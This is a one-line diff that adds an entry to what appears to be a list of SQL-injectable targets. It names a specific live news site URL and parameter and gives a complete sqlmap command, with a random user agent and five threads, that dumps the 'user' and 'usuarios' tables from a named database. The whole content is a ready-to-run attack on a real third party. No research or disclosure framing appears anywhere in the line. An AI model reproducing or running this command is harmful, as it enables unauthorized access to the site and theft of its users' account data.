@@ -1,0 +1,1 @@
+http://www.lifevitoria.com.br/noticias.php?not_id=88 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.lifevitoria.com.br/noticias.php?not_id=88 -D lifevitoria -T user,usuarios --dump
